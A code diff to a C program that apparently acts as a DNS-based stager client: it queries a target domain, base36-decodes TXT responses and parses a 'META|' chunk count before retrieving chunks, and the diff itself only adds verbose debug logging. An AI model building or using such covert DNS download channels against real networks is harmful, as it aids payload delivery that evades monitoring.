@@ -751,12 +751,13 @@ static int send_dns_message(const char *message, const char *target_domain, char
             unsigned char decoded[4096];
             size_t decoded_len = base36_decode(txt_response, decoded, sizeof(decoded));
             
-    DEBUG_PRINT("[*] Decoded length: %zu\n", decoded_len);
-            
+    DEBUG_PRINT("[*] Base36 decode: %zu bytes decoded from %zu bytes input\n", 
+                decoded_len, strlen(txt_response));
+    
             if (decoded_len > 0 && decoded_len < response_size) {
                 memcpy(response, decoded, decoded_len);
                 response[decoded_len] = '\0';
-    DEBUG_PRINT("[*] Final response: %s\n", response);
+    DEBUG_PRINT("[*] Decoded response: %s\n", response);
                 return 0;
             } else if (decoded_len == 0) {
                 // Maybe it's a plain text error response
@@ -928,16 +929,26 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     
-    DEBUG_PRINT("[*] Received response: %s\n", response);
+    DEBUG_PRINT("[*] ========================================\n");
+    DEBUG_PRINT("[*] STG Response Received (length=%zu)\n", strlen(response));
+    DEBUG_PRINT("[*] Response: %s\n", response);
+    DEBUG_PRINT("[*] ========================================\n");
     
     // Parse metadata response: META|<total_chunks>
     if (strncmp(response, "META|", 5) != 0) {
-    DEBUG_PRINT("[!] Invalid response format (expected META|)\n");
+    DEBUG_PRINT("[!] ========================================\n");
+    DEBUG_PRINT("[!] ERROR: Invalid META response format!\n");
+    DEBUG_PRINT("[!] Expected: META|<number>\n");
+    DEBUG_PRINT("[!] Received: %s\n", response);
+    DEBUG_PRINT("[!] Length: %zu bytes\n", strlen(response));
+    DEBUG_PRINT("[!] First 20 chars: %.20s\n", response);
+    DEBUG_PRINT("[!] ========================================\n");
         return 1;
     }
     
     // Parse the response - format: META|total_chunks
     total_chunks = atoi(response + 5);
+    DEBUG_PRINT("[*] Parsed chunk count: %d\n", total_chunks);
     
     if (total_chunks <= 0 || total_chunks > MAX_CHUNKS) {
     DEBUG_PRINT("[!] Invalid chunk count: %d\n", total_chunks);
